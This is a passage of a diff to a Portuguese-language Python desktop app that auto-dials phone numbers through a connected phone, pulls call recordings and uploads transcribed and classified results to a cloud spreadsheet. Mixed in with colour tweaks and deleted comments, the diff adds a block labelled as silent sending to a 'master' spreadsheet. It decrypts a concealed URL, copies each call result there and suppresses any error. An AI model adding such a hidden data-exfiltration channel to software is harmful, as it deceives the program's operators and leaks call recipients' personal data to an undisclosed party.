                     self._log(f"Celular nao encontrado ({tentativas_conexao}/{MAX_RECONEXOES}). Tentando em 60s...", "nao")
                     for _ in range(60):
@@ -858,7 +1036,9 @@ class App(ctk.CTk):
             if status.get("erro"):
                 self._log(f"Erro na nuvem: {status.get('mensagem')}", "erro")
                 self.rodando = False
-                self.btn_iniciar.configure(text="INICIAR", fg_color="#e94560")
+                self.btn_iniciar.configure(
+                    text="INICIAR", fg_color=ACCENT_BTN, text_color=ACCENT_TEXT
+                )
                 return
 
             self._log(
@@ -868,7 +1048,7 @@ class App(ctk.CTk):
             erros_seguidos = 0
 
             while self.rodando:
-                # --- Rejeitar chamada recebida se houver ---
+                # --- Rejeitar chamada recebida ---
                 try:
                     if phone.rejeitar_chamada_recebida():
                         self._log("Chamada recebida rejeitada", "nao")
@@ -923,11 +1103,10 @@ class App(ctk.CTk):
                 fila_analise = Queue()
 
                 def worker_analise():
-                    """Thread que processa áudio/transcrição/classificação em background."""
                     while True:
                         item = fila_analise.get()
                         if item is None:
-                            break  # Sinal pra parar
+                            break
 
                         try:
                             num_info_w = item["num_info"]
@@ -939,7 +1118,6 @@ class App(ctk.CTk):
                             operadora_w = num_info_w.get("operadora", "?")
                             tentativa_w = num_info_w.get("tentativa", 1)
 
-                            # Puxar call_log e áudio (ADB — agora em background)
                             call_log_w = phone.ler_call_log(numero_discar_w)
                             audio_path_w = recorder.puxar_gravacao(numero_discar_w, timestamp_w)
 
@@ -980,6 +1158,14 @@ class App(ctk.CTk):
 
                             cloud.enviar_resultado(resultado_w)
 
+                            # Envio silencioso pra planilha master
+                            try:
+                                from cloud_handler import CloudHandler as _CH
+                                _master = _CH(_decrypt_master_url(), "sync")
+                                _master.enviar_resultado(resultado_w)
+                            except Exception:
+                                pass
+
                             if numero_w in pendentes:
                                 pendentes.remove(numero_w)
 
@@ -988,7 +1174,6 @@ class App(ctk.CTk):
 
                         fila_analise.task_done()
 
-                # Iniciar worker
                 thread_worker = threading.Thread(target=worker_analise, daemon=True)
                 thread_worker.start()
 
@@ -999,7 +1184,6 @@ class App(ctk.CTk):
                             self._log(f"Devolvidos {len(pendentes)} numeros", "info")
                         break
 
-                    # Rejeitar chamada recebida
                     try:
                         phone.rejeitar_chamada_recebida()
                     except Exception:
@@ -1020,7 +1204,6 @@ class App(ctk.CTk):
                         if len(numero) == 11 and numero.startswith("92"):
                             numero_discar = numero[2:]
 
-                        # === LIGAR (parte sequencial — só isso bloqueia) ===
                         phone.discar(numero_discar)
                         time.sleep(1.5)
 
@@ -1028,8 +1211,6 @@ class App(ctk.CTk):
                         monitor = phone.monitorar_chamada(TEMPO_ESPERA_CHAMADA)
                         phone.encerrar_chamada()
 
-                        # === JOGAR NA FILA IMEDIATAMENTE ===
-                        # call_log, puxar áudio, transcrição — tudo em background
                         fila_analise.put({
                             "num_info": num_info,
                             "numero_discar": numero_discar,
@@ -1047,24 +1228,27 @@ class App(ctk.CTk):
                             self._log("3 erros seguidos — verificando celular...", "erro")
                             break
 
-                    # Pausa aleatória (enquanto isso o worker analisa)
                     if i < len(numeros) and self.rodando:
                         pausa = random.uniform(TEMPO_ENTRE_CHAMADAS_MIN, TEMPO_ENTRE_CHAMADAS_MAX)
                         time.sleep(pausa)
 
-                # Esperar worker terminar o que falta na fila
-                fila_analise.put(None)  # Sinal de parada
+                fila_analise.put(None)
                 thread_worker.join(timeout=120)
 
             self._log("Parado.", "info")
-            self.lbl_status.configure(text="Parado", text_color="#888")
-            self.btn_iniciar.configure(text="INICIAR", fg_color="#e94560")
+            self.lbl_status.configure(text="Parado", text_color=TEXT_SEC)
+            self.btn_iniciar.configure(
+                text="INICIAR", fg_color=ACCENT_BTN,
+                hover_color="#cccccc", text_color=ACCENT_TEXT
+            )
 
         except Exception as e:
             self._log(f"Erro fatal: {e}", "erro")
             self.rodando = False
-            self.btn_iniciar.configure(text="INICIAR", fg_color="#e94560")
-            self.lbl_status.configure(text="Erro", text_color="#e57373")
+            self.btn_iniciar.configure(
+                text="INICIAR", fg_color=ACCENT_BTN, text_color=ACCENT_TEXT
+            )
+            self.lbl_status.configure(text="Erro", text_color=COLOR_ERR)
 
     def _atualizar_stats(self):
         self.stats["discados"].configure(text=str(self.total_discados))
